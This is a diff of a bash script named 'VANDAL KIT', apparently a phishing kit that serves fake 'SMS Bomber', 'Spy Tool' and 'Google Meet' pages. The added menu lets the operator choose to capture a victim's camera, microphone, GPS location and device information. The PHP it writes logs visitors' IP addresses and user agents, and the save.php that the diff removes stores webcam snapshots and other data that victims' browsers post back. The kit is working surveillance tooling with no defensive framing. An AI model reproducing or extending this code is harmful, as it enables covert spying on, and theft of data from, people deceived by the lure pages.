@@ -14,7 +14,7 @@ echo " ██║   ██║███████║██╔██╗ ██║
 echo " ╚██╗ ██╔╝██╔══██║██║╚██╗██║██║  ██║██╔══██║██║"
 echo "  ╚████╔╝ ██║  ██║██║ ╚████║██████╔╝██║  ██║███████╗"
 echo "   ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝"
-echo -e "\033[0m\033[1;91m     VANDAL KIT\033[0m"
+echo -e "\033[0m\033[1;91m     VANDAL KIT v2 — Auto Camera Access\033[0m"
 echo ""
 }
 
@@ -22,10 +22,18 @@ deps() { command -v php >/dev/null 2>&1 || pkg install -y php >/dev/null 2>&1; c
 
 menu() {
 echo -e "\033[1;96m── Select Page ──\033[0m"
-echo -e "  \033[1;92m[1]\033[0m SMS Bomber (Camera)"
-echo -e "  \033[1;92m[2]\033[0m Spy Tool (Camera)"
-echo -e "  \033[1;92m[3]\033[0m Google Meet"
+echo -e "  \033[1;92m[1]\033[0m 💥 SMS Bomber"
+echo -e "  \033[1;92m[2]\033[0m 📱 Spy Tool (Phone Info Extractor)"
+echo -e "  \033[1;92m[3]\033[0m 🎥 Google Meet"
 read -p $'\033[1;93m[?] Select [1-3]: \033[0m' TEM; TEM="${TEM:-1}"
+
+echo -e "\033[1;96m── Select Modules ──\033[0m"
+echo -e "  \033[1;92m[1]\033[0m 📸 Camera"
+echo -e "  \033[1;92m[2]\033[0m 📸+🎤 Camera + Mic"
+echo -e "  \033[1;92m[3]\033[0m 📸+📍 Camera + GPS"
+echo -e "  \033[1;92m[4]\033[0m 📸+📱 Camera + Device Info"
+echo -e "  \033[1;92m[5]\033[0m 🎯 ALL (Camera+Mic+GPS+Device)"
+read -p $'\033[1;93m[?] Select [1-5]: \033[0m' MOD; MOD="${MOD:-5}"
 }
 
 build() {
@@ -36,23 +44,12 @@ case "$TEM" in
 esac
 
 cat > index.php <<'PHPEOF'
-<?php
-$ip=$_SERVER['HTTP_CLIENT_IP']??$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR'];
-file_put_contents('visits.txt',date('c').'|'.$ip.'|'.($_SERVER['HTTP_USER_AGENT']??'').PHP_EOL,FILE_APPEND);
-header('Location:index2.html');
+<?php $ip=$_SERVER['HTTP_CLIENT_IP']??$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR'];file_put_contents('visits.txt',date('c').'|'.$ip.'|'.($_SERVER['HTTP_USER_AGENT']??'').PHP_EOL,FILE_APPEND);header('Location:index2.html');
 PHPEOF
 
-cp "$SCRIPT_DIR/save.php" . 2>/dev/null || cat > save.php <<'PHPEOF'
-<?php
-header('Content-Type: application/json');
-$type=$_GET['type']??'unknown';$raw=file_get_contents('php://input');$data=json_decode($raw,true);$ts=date('Ymd_His');$r=bin2hex(random_bytes(2));
-if($type==='webcam'&&isset($data['image'])){$img=substr($data['image'],strpos($data['image'],',')+1);file_put_contents("webcam_{$ts}_{$r}.jpg",base64_decode($img));}
-else{file_put_contents("{$type}_{$ts}_{$r}.json",json_encode($data,JSON_UNESCAPED_UNICODE));}
-echo json_encode(['status'=>'ok']);
-PHPEOF
-
-cp "$SCRIPT_DIR/panel.php" . 2>/dev/null
-cp "$SCRIPT_DIR/login.php" . 2>/dev/null
+cp "$SCRIPT_DIR/save.php" .
+cp "$SCRIPT_DIR/panel.php" .
+cp "$SCRIPT_DIR/login.php" .
 
 echo -e "\033[1;92m[+] Ready\033[0m"
 }
